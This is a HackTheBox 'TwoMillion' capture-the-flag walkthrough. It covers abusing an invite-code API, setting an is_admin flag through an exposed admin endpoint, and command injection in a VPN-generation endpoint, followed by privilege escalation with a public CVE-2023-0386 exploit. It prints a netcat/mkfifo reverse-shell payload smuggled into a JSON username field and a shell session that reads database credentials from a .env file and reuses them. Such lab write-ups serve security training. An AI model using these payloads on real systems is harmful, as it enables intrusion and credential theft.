![](Pasted%20image%2020241201171446.png)
# [Enumeration]()

Scanning open ports of given IP - `10.10.11.221` @ `2million.htb`

```
┌──[hexadivine@hackthebox]─[~]
└──╼ $ nmap 2million.htb 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-01 13:15 IST
Nmap scan report for 2million.htb (10.10.11.221)
Host is up (0.47s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Visiting the website.

![](Pasted%20image%2020241201131826.png)
![](Pasted%20image%2020241201131836.png)

Found below interesting JavaScript code at <http://2million.htb/js/inviteapi.min.js>

```javascript
eval(function(p, a, c, k, e, d) {
    e = function(c) {
        return c.toString(36)
    };
    if (!''.replace(/^/, String)) {
        while (c--) {
            d[c.toString(a)] = k[c] || c.toString(a)
        }
        k = [function(e) {
            return d[e]
        }];
        e = function() {
            return '\\w+'
        };
        c = 1
    };
    while (c--) {
        if (k[c]) {
            p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c])
        }
    }
    return p
}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}', 24, 24, 'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'), 0, {}))
```

Calling `makeInviteCode` function gives below response.

![](Pasted%20image%2020241201132803.png)
```json
{
	0: 200
	data: Object { data: "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr", enctype: "ROT13" }
	hint: "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
	success: 1
}
```

Data contains encoded message with `rot13`.

```
┌──[hexadivine@hackthebox]─[~]
└──╼ $ rot13 Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

Visiting <http://2million.htb/api/v1/invite/generate>

![](Pasted%20image%2020241201133317.png)

Sending `post` request from Firefox.

![](Pasted%20image%2020241201133444.png)
![](Pasted%20image%2020241201133505.png)
![](Pasted%20image%2020241201133533.png)

Found invite code. However this is encoded to base64. 

```json
{
	"0":200,
	"success":1,
	"data":{"code":"TUkzTVMtT05COEotSlBJWEgtNzNWV1I=","format":"encoded"}
}
```

Decoding the code `TUkzTVMtT05COEotSlBJWEgtNzNWV1I=` gives actual code.

```
┌──[hexadivine@hackthebox]─[~]
└──╼ $ echo TUkzTVMtT05COEotSlBJWEgtNzNWV1I= | base64 -d
MI3MS-ONB8J-JPIXH-73VWR
```

Registering and logging in with the invite code `MI3MS-ONB8J-JPIXH-73VWR`

![](Pasted%20image%2020241201133927.png)
![](Pasted%20image%2020241201134020.png)

![](Pasted%20image%2020241201134041.png)

Exploration helped find the <http://2million.htb/api> endpoint is publicly exposed.

![](Pasted%20image%2020241201135737.png)

This suggest to visit there might be `/api/v1` endpoint. Using Burp-suite to intercept and repeat the request.

![](Pasted%20image%2020241201140017.png)
![](Pasted%20image%2020241201140057.png)

Below section looks interesting. 

```json
"admin":{"GET":{"\/api\/v1\/admin\/auth":"Check if user is admin"},"POST":{"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"},"PUT":{"\/api\/v1\/admin\/settings\/update":"Update user settings"}}
```

Sending PUT request to `/api/v1/admin/settings/update` to update user settings

![](Pasted%20image%2020241201140405.png)

Need to update content type. In this case it's more likely `application/json`.

![](Pasted%20image%2020241201140520.png)

Need to update missing parameter `email`

![](Pasted%20image%2020241201140620.png)

Need to update missing parameter `is_admin` and updating this parameter to allow admin access.

![](Pasted%20image%2020241201140707.png)
![](Pasted%20image%2020241201140725.png)

Checking it we are now admin or not. Below response suggest that we are indeed admin.

![](Pasted%20image%2020241201141100.png)

Now that we are admin, we can access `/api/v1/admin/vpn/generate` to generate user specific vpn file.

![](Pasted%20image%2020241201142411.png)
![](Pasted%20image%2020241201143529.png)
![](Pasted%20image%2020241201143613.png)

Below response shows the ovpn file. This is using `cat` command to view the file. We can exploit this to perform `command injection` exploit.

![](Pasted%20image%2020241201143656.png)

# Exploitation

Inserting `a; ls #` payload to `username` parameter to check command injection exploit possibility. Below response shows that the server is vulnerable to command injection.

![](Pasted%20image%2020241201143342.png)

By exploiting command injection we can achieve remote code execution using below payload.

```
{
	"username":"a; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.15 9999 >/tmp/f #"
}
```

![](Pasted%20image%2020241201155429.png)

```
┌──[hexadivine@hackthebox]─[~]
└──╼ $ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.16.15] from (UNKNOWN) [10.10.11.221] 51692
bash: cannot set terminal process group (1171): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@2million:~/html$ 
```

Checking `.env` file

```
www-data@2million:~/html$ ls -la
ls -la
total 56
drwxr-xr-x 10 root root 4096 Dec  1 10:40 .
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 Dec  1 10:40 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass---
www-data@2million:~/html$ 
```

Found the password of `admin` user.

```
www-data@2million:~/html$ su admin    
su admin
Password: SuperDuperPass---
id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
```

# [CTUF]()

Searching user flag file.

```
$ find / -name user.txt 2>/dev/null
/home/admin/user.txt
```

Checking content of `/home/admin/user.txt`

```
$ cat /home/admin/user.txt
f8404dc7c05dfa9a10c2e3ce6c557---
```

# [Enumeration of PrivEsc]()

Checking email from the dir `/var/spool/mail`.

```
$ pwd
/var/spool/mail

$ cat admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

Searching `OverlayFS / FUSE exploit` found [this](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/) article explaining `CVE-2023-0386`. The github exploit is [here](https://github.com/sxlmnwb/CVE-2023-0386)

# [Privilege Escalation]()

Downloading [exploit zip](https://github.com/sxlmnwb/CVE-2023-0386/archive/refs/heads/master.zip)file to target system. Following below instructions.

![](Pasted%20image%2020241201170611.png)

![](Pasted%20image%2020241201170815.png)
![](Pasted%20image%2020241201170936.png)

This gives the root permissions. 

# [CTRF]()

Finding the `root.txt` file and capturing the root flag.

```
root@2million:~/CVE-2023-0386-master# find / -name root.txt 2>/dev/null
/root/root.txt
root@2million:~/CVE-2023-0386-master# cat /root/root.txt
c8d69b79ff310ddbc9c0bf42bf28f---
```